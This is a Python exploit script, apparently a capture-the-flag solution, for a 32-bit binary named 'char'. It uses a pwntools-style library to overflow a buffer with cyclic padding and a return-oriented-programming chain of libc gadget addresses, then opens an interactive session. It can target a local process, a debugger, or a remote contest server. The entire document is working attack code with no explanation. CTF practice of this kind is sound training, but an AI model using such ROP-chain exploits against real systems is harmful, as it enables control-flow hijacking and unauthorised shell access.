#!/usr/bin/env python
# coding:utf-8

from ctf import *

binary = './char'
context.arch = 'x86'
context.log_level= 'INFO'
mode = args['MODE'].lower()
os.environ['LD_LIBRARY_PATH'] = os.curdir
# os.environ['LD_PRELOAD'] = './nosleep.so'

elf = ELF(binary)
libc = [x for x in elf.libs.keys() if 'libc.so' in x]
libc = ELF(libc and libc[0] or './libc.so.6')

def exploit():
    if mode == 'debug':
        io = debug(binary)
        io.b([
            0x08048692,
        ])
        io.r()
    elif mode == 'remote':
        io = remote('202.120.7.214', 23222)
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(binary)

    payload = cyclic(32)
    payload += p32(0x556a6730)
    payload += p32(0x556a6730)

    payload += p32(0x5557734e) # pop ebx ; ret
    payload += p32(0x712d2f74)
    payload += p32(0x55623c37) # pop esi ; ret
    payload += p32(0x72217040)
    payload += p32(0x556e5554) # add ebx, esi ; add dword ptr [edx], ecx ; ret
    payload += p32(0x556e5554) # add ebx, esi ; add dword ptr [edx], ecx ; ret

    payload += p32(0x555f3555) # pop edx ; xor eax, eax ; pop edi ; ret
    payload += p32(0x21217031)
    payload += cyclic(4)
    payload += p32(0x55615d44) # pop eax ; cmp eax, 0xfffff001 ; jae 0xb7d55 ; ret
    payload += p32(0x34385d71)
    payload += p32(0x5560666e) # add eax, edx ; ret
    payload += p32(0x55687926) # push eax ; ret
    payload += p32(0x556b2132)
    payload += p32(0x556b2132)
    payload += p32(0x556b2132)

    io.sendline(payload)

    if mode == 'debug':
        # io.interrupt()
        io.sendlines('''
            b *0x55687926
            c
        '''.strip().split('\n'))

    io.interactive()

if __name__ == '__main__':
    exploit()
